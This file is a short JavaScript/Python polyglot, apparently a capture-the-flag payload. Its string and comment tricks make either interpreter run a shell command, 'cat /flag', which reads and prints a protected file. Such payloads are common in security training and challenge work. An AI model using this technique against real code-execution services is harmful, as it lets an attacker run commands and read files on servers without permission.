a = 1 // 1 ; b = '''

const { exec } = require("child_process");

exec("cat /flag", (error, stdout, stderr) => {
    console.log(`${stdout}`);
});

/* '''

import os
os.system('cat /flag')

# */